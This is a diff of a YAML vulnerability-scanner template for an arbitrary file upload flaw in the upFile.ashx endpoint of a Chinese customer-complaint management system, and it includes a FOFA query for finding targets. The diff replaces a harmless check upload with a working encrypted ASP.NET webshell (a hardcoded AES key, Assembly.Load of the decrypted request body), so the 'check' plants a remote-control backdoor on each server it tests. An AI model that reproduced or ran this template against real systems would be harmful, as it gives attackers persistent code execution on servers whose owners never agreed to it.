@@ -1,39 +1,34 @@
+expression: r0()
 id: cmakesu-upfile-ashx-anyfile-upload
-
 info:
-  name: CMA 客诉管理系统 upFile.ashx 任意文件上传漏洞
   author: daffainfo
+  description: "CMA \u5BA2\u8BC9\u7BA1\u7406\u7CFB\u7EDF upFile.ashx\u6587\u4EF6\u5B58\
+    \u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u6F0F\
+    \u6D1E\u653B\u51FB\u8005\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u63A7\
+    \u5236\u670D\u52A1\u5668\nfofa-query: title=\"CMA\u5BA2\u8BC9\u7BA1\u7406\u7CFB\
+    \u7EDF\u624B\u673A\u7AEF\"\n"
+  name: "CMA \u5BA2\u8BC9\u7BA1\u7406\u7CFB\u7EDF upFile.ashx \u4EFB\u610F\u6587\u4EF6\
+    \u4E0A\u4F20\u6F0F\u6D1E"
+  reference:
+  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/CMA%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20upFile.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
   severity: critical
   verified: false
-  description: |-
-    CMA 客诉管理系统 upFile.ashx文件存在任意文件上传漏洞，通过漏洞攻击者可以上传任意文件控制服务器
-    fofa: title="CMA客诉管理系统手机端"
-  reference:
-    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/CMA%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20upFile.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
-  tags: cmakesu,fileupload
-  created: 2024/01/01
-
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes(r1 + '.aspx'))
+    request:
+      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"file\"; filename=\"{{r1}}.aspx\"\r\nContent-Type: application/octet-stream\r\
+        \n\r\n<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"\
+        %><%Session.Add(\"k\",\"e45e329feb5d925b\");byte[] k = Encoding.Default.GetBytes(Session[0]\
+        \ + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new\
+        \ System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c,\
+        \ 0, c.Length)).CreateInstance(\"U\").Equals(this);%>\r\n\r\n--WebKitFormBoundary{{rboundary}}--\r\
+        \n"
+      headers:
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+      method: POST
+      path: /upFile/upFile.ashx
 set:
   r1: randomLowercase(20)
   rboundary: randomLowercase(8)
-rules:
-  r0:
-    request:
-      method: POST
-      path: /upFile/upFile.ashx
-      headers:
-        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
-      body: "\
-        --WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.aspx\"\r\n\
-        Content-Type: application/octet-stream\r\n\
-        \r\n\
-        {{r1}}\r\n\
-        \r\n\
-        --WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: |
-      response.status == 200 && 
-      response.body.bcontains(b'"path":') &&
-      response.body.bcontains(bytes(r1 + '.aspx'))
-expression: r0()
